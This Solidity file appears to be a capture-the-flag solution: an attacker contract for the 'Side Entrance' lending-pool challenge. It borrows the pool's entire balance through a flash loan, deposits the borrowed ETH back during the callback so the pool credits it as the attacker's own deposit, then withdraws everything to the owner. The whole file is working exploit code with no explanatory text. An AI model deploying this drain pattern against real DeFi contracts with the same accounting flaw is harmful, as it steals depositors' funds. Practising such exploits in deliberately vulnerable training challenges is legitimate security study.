// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker {
    SideEntranceLenderPool public immutable pool;
    address public immutable owner;
    uint256 immutable poolBalance;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        poolBalance = _pool.balance;
        owner = msg.sender;
    }

    receive() external payable {}

    function execute() external payable {
        // Increase amount of balance mapping in pool contract
        pool.deposit{value: poolBalance}();
    }

    function attack() external {
        require(msg.sender == owner, "You are not the owner");

        pool.flashLoan(poolBalance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }
}